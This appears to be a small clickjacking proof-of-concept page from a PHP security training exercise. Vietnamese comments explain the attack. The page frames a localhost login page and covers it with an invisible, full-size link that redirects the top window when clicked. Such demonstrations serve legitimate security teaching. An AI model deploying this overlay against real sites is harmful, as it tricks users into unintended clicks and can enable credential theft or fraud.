<html>

<head>
    <style>
        body {
            position: relative;
            margin: 0;
        }

        iframe,
        div,
        a {
            border: none;
            position: absolute;
            width: 100%;
            height: 100%;
        }

        div {
            z-index: 100;
        }

        a {
            display: block;
        }
    </style>
</head>

<body>
    <!-- Hacker sẽ nhúng trang web chính chủ vào trang web giả mạo -->
    <iframe src="http://localhost/training-php/login.php"></iframe>
    <!-- Liên kết người dụng bị lợi dụng click chuột  -->
    <!-- (có thể là quảng cáo hoặc đánh cắp thông tin) -->
    <div><a href="https://www.google.com/" target="_top"></a></div>
</body>

</html>